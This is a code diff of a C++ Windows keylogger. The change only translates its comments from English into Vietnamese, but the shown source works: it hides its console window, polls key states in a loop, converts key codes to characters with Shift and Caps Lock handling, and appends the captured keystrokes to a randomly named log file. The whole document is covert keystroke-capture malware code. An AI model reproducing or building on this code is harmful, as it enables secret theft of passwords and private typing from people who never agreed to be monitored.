@@ -1,7 +1,7 @@
 #define _WIN32_WINNT 0x0500
 #include "keylogger.h"
 
-// Create random file name
+// Tạo tên file
 std::string keylogger::generate_random_string(size_t length)
 {
     const std::string characters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -16,7 +16,7 @@ std::string keylogger::generate_random_string(size_t length)
     return random_string;
 }
 
-// Append string to log file
+// Thêm các ký tự mới vào file keylogger
 void keylogger::LOG(const string &input)
 {
     std::string current_path;
@@ -34,12 +34,11 @@ void keylogger::LOG(const string &input)
     }
 }
 char VkCodeToChar(int vkCode) {
-    // A more robust implementation would handle Caps Lock,
-    // Num Lock, and other states.
+    // Sử lý CapLock, NumLock.
     bool shift_pressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
 
     switch (vkCode) {
-        // Handle number keys with and without shift
+        // Xử lý các phím số không có Shift
         case '0': return shift_pressed ? ')' : '0';
         case '1': return shift_pressed ? '!' : '1';
         case '2': return shift_pressed ? '@' : '2';
@@ -51,17 +50,17 @@ char VkCodeToChar(int vkCode) {
         case '8': return shift_pressed ? '*' : '8';
         case '9': return shift_pressed ? '(' : '9';
 
-        // Handle letter keys, accounting for shift/caps lock
-        case 'A' ... 'Z': { // This is a GNU extension, for MSVC use 'A': 'A', 'B': 'B', etc.
+        // Xử lý các chữ với CapLock và Shift
+        case 'A' ... 'Z': { 
             bool caps_lock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
             if (shift_pressed == caps_lock) {
                 return static_cast<char>(vkCode); // Lowercase
             } else {
-                return static_cast<char>(vkCode - 32); // Uppercase (A=65, a=97, difference is 32)
+                return static_cast<char>(vkCode - 32); // Uppercase (A=65, a=97)
             }
         }
         
-        // Handle punctuation keys
+        // Xử lý dấu câu và các ký tự
         case VK_OEM_1: return shift_pressed ? ':' : ';';
         case VK_OEM_2: return shift_pressed ? '?' : '/';
         case VK_OEM_3: return shift_pressed ? '~' : '`';
@@ -74,15 +73,15 @@ char VkCodeToChar(int vkCode) {
         case VK_OEM_MINUS: return shift_pressed ? '_' : '-';
         case VK_OEM_PLUS: return shift_pressed ? '+' : '=';
         
-        // Handle spaces and other keys
+        // Xử lý dấu cách, tab
         case VK_SPACE: return ' ';
         case VK_TAB: return '\t';
         
         default:
-            return 0; // Return a null character for unhandled keys
+            return 0; 
     }
 }
-// Handle special keys
+// Xử lý các phím đặc biệt
 bool keylogger::HandleSpecialKey(int keyCode)
 {
     switch (keyCode)
@@ -131,7 +130,7 @@ bool keylogger::HandleSpecialKey(int keyCode)
     }
 }
 
-// Check if key is printable ASCII
+// Xem thử key có thể in ra dưới dạng ASCII
 bool keylogger::IsPrintable(int key)
 {
     return (key >= 32 && key <= 126);
@@ -139,7 +138,7 @@ bool keylogger::IsPrintable(int key)
 
 void keylogger::Keylogger()
 {
-    // Hide console window
+    // Giấu window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     LOG("\n[Keylogger Started]\n");
@@ -147,11 +146,7 @@ void keylogger::Keylogger()
    
     while (keyloggerON) {
         if (keyloggerRunning) {
-            Sleep(70); // Avoid CPU overuse
-
-            // The loop for keys should be more targeted or use a different approach.
-            // A more effective method is to use a global keyboard hook (SetWindowsHookEx).
-            // This is a simplified loop that checks common key codes.
+            Sleep(70); // Tránh việc sử dụng quá nhiều CPU
             for (int key = 8; key <= 255; ++key) {
                 if (GetAsyncKeyState(key) & 0x0001) {
                     char c = VkCodeToChar(key);
